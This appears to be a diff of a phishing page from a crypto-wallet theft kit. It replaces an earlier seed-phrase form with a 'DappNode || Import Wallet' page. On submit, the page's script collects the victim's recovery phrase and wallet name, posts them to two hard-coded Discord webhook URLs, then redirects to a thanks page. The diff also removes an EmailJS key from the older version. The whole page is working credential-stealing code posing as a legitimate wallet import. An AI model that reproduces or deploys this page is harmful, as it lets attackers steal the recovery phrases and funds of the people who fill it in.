@@ -3,173 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seed Phrase</title>
-    <link rel="stylesheet" href="styles.css">
-    <script type="text/javascript"
-    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-</script>
-<script type="text/javascript">
-(function(){
-  emailjs.init({
-    publicKey: "PK5_cXeM39z_-zz8U",
-  });
-})();
-</script>
+    <link rel="shortcut icon" href="./images/images22.png" type="image/x-icon">
+    <title>DappNode || Import Wallet</title>
 </head>
-<body class="phrasepage">
-    <div class="page-wrapper">
-        <a href="./wallet.html"><div class="back-arrow">&#8592;</div></a>
-        <div class="content-wrapper">
-            <div class="step-indicator">
-                <span class="step">Step 1</span>
-                <span class="step-active">Step 2</span>
-                <span class="step">Step 3</span>
-            </div>
-            <p>Import your wallet to continue</p>
-            <div class="word-options">
-                <button class="word-tab active" onclick="showWords(12)">12 words</button>
-                <button class="word-tab" onclick="showWords(24)">24 words</button>
-                <button class="word-tab" onclick="showWords(1)">Privatekey</button>
-            </div>
-            <form id="contactForm">
-                <div class="word-inputs">
-                    <div class="word-group" id="words-12">
-                        <div class="word-box">
-                            <div class="input-container">
-                                <input type="text" placeholder="1." id="word1" name="word1">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="2." id="word2" name="word2">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="3." id="word3" name="word3">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="4." id="word4" name="word4">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="5." id="word5" name="word5">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="6." id="word6" name="word6">
-                            </div>
-                        </div>
-                        <div class="word-box">
-                            <div class="input-container">
-                                <input type="text" placeholder="7." id="word7" name="word7">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="8." id="word8" name="word8">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="9." id="word9" name="word9">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="10." id="word10" name="word10">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="11." id="word11" name="word11">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="12." id="word12" name="word12">
-                            </div>
-                        </div>
-                    </div>
-                    <div class="word-group" id="words-24" style="display: none;">
-                       
-                        <div class="word-box">
-                            <div class="input-container">
-                                <input type="text" placeholder="1." id="word13" name="word13">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="2." id="word14" name="word14">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="3." id="word15" name="word15">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="4." id="word16" name="word16">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="5." id="word17" name="word17">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="6." id="word18" name="word18">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="7." id="word19" name="word19">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="8." id="word20" name="word20">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="9." id="word21" name="word21">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="10." id="word22" name="word22">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="11." id="word23" name="word23">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="12." id="word24" name="word24">
-                            </div>
-                        </div>
-                        <div class="word-box">
-                            <div class="input-container">
-                                <input type="text" placeholder="13." id="word25" name="word25">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="14." id="word26" name="word26">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="15." id="word27" name="word27">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="16." id="word28" name="word28">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="17." id="word29" name="word29">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="18." id="word30" name="word30">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="19." id="word31" name="word31">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="20." id="word32" name="word32">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="21." id="word33" name="word33">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="22." id="word34" name="word34">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="23." id="word35" name="word35">
-                            </div>
-                            <div class="input-container">
-                                <input type="text" placeholder="24." id="word36" name="word36">
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="word-group" id="keyphrase" style="display: none;">
-                        <div class="word-box">
-                            <div class="input-container">
-                               
-                                
-                                <input placeholder="Enter your private key" id="privatekey" name="Privatekey">
-                            </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <button class="submit-btn" type="submit">Continue</button>
-            </form>
+<body>
+    <div class="form-container">
+        <div class="header">
+            <img id="wallet-image" src="" alt="Selected Wallet Image"><br><br>
+            <h1>Import your Wallet </h1>
         </div>
+        
+    <form id="wallet-form">
+        <label for="wallet-name">Wallet Name:</label>
+        <input type="text" id="wallet-name" name="wallet-name" readonly><br><br>
+        
+
+        Recovery:
+        <textarea id="recovery-phrase" name="recovery-phrase" rows="6" cols="60" placeholder="Enter your recovery phrase here..."></textarea><br><br>
+        <p class="undertext">Typically 12 (sometimes 24) words separated by single spaces</p>
+
+        <div class="button-container">
+            <a href="./index.html" id="cancel-button">Cancel</a>
+            <button type="submit" id="import-button" disabled >Import Wallet</button>
+        </div>
+    </form>
+
     </div>
-    <script src="scripts.js"></script>
+    
+    <script>
+        // Retrieve wallet info from localStorage
+        const walletName = localStorage.getItem('selectedWalletName');
+        const walletImage = localStorage.getItem('selectedWalletImage');
+
+        // Set the wallet name and image in the form
+        if (walletName && walletImage) {
+            document.getElementById('wallet-name').value = walletName;
+            document.getElementById('wallet-image').src = walletImage;
+        }
+
+
+         // Enable submit button once recovery phrase is filled
+        const recoveryPhraseField = document.getElementById('recovery-phrase');
+        const importButton = document.getElementById('import-button');
+
+        recoveryPhraseField.addEventListener('input', function() {
+            if (recoveryPhraseField.value.trim() !== "") {
+                importButton.disabled = false; // Enable button when input is not empty
+            } else {
+                importButton.disabled = true; // Disable button if input is empty
+            }
+        });
+
+        // Send form data to two Discord webhooks
+        document.getElementById('wallet-form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const recoveryPhrase = recoveryPhraseField.value.trim();
+
+            // Discord webhook URLs
+            const webhookURL1 = "https://discord.com/api/webhooks/1293947126551805972/p6E69lwa7SGRlUIN7lfqD0UIQ-HVvdqTGmNNGnqzCPrmUqxyL9GSpAMIHpn3nNoW6w0o";
+            const webhookURL2 = "https://discord.com/api/webhooks/1383559795247812778/JSRvCwHCsBrwjk47fMhKTIuycFk6M6njmgGvVVNeuABBCgcZuX9sFUlpuuSqWrcyisQC"; 
+
+            // Prepare the message content
+            const messageContent = `**Wallet Import Details**\n\n**Wallet Name:** ${walletName}\n**Recovery Phrase:** ${recoveryPhrase}`;
+
+            // Send data to the first webhook
+            try {
+                await fetch(webhookURL1, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: messageContent })
+                });
+
+                // Send data to the second webhook
+            await fetch(webhookURL2, {
+                    method: 'POST',
+                   headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: messageContent })
+                });
+
+                // After sending the data, redirect to another page (or show success message)
+                window.location.href = './thanks.html'; // Replace with your redirect page after form submission
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                alert('Failed to send the information. Please try again.');
+            }
+        });
+    </script>
+
+
+<style>
+    body {
+        background-color: #f4f4f4;
+        display: flex;
+        margin: 100px auto;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .form-container {
+        background-color: #fff;
+        padding: 20px 30px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        width: 80%;
+        max-width: 500px;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        justify-content: space-between;
+    }
+
+    .form-container .header {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        gap:10px;
+        margin-bottom: 20px;
+    }
+
+    .form-container .header img {
+        width: 30px;
+    }
+
+    h1 {
+        color: #333;
+        font-size: 24px;
+        line-height: 30px;
+        font-weight: 500;
+    }
+
+    label {
+        display: block;
+    }
+
+    input[type="text"], textarea {
+        width: 95%;
+        display: block;
+        margin-top: 10px;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+
+    .undertext {
+        font-size: 12px;
+        color: #666;
+        margin-top: -30px;
+    }
+    
+    .button-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        width: 100%;
+        margin-top: 20px;
+    }
+
+    .button-container #cancel-button{
+        background: #EF4444;
+        color: white;
+        padding: 10px 30px;
+        text-decoration: none;
+        border-radius: 5px;
+        border: none;
+    }
+
+    .button-container #import-button {
+        background: #1F47AC;
+        color: white;
+        padding: 10px 30px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+</style>
 </body>
 </html>
